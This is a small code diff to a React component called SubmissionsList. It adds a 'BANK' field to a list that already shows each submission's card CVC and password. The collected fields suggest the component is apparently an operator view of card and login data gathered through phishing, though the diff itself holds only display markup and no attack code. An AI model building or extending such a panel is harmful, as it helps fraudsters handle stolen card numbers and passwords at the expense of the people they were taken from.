@@ -113,6 +113,11 @@ export default function SubmissionsList() {
                     <span className="mx-4"> {submission.cvc}</span>
                   </div>
 
+                  <div className='flex justify-start'>
+                    <strong className='mx-3 text-red-300 mx-4'>BANK </strong>
+                    <span className="mx-4"> {submission.bank}</span>
+                  </div>
+
 
                   <div className='flex justify-start'>
                     <strong className='mx-3 text-red-300 mx-4'>Pass </strong>
